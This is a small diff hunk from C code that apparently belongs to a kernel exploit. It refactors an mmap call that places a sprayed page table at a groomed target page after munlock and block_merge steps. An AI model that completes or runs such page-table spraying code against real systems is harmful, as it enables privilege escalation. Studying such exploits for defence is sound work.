@@ -59,7 +59,7 @@ int main() {
         munlock(target, PAGE_SIZE);
         block_merge(target, 0);
         // Install the page table at the target.
-        mmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE,
+        mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
              PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE,
              fd_shm,
              0);
